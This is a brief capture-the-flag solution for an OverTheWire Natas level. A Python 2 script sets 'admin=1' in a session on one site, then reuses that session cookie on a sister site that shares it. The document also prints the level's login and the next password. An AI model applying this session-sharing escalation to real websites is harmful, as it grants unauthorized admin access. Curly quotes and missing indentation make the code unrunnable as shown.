# natas22

```python
import httplib,sys
from base64 import b64encode
from urllib import urlencode

sessid=’whateversessid’
httpClient = None
try:
userAndPass = b64encode(b”natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ”).decode(“ascii”)
body=urlencode({‘submit’ : ‘a’, ‘admin’:’1′})
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas21-experimenter.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘POST’, ‘/index.php?debug=a’, body=body, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

httpClient = None
try:
userAndPass = b64encode(b”natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ”).decode(“ascii”)
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas21.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php’, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()
```

Two websites are sharing the same session.
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
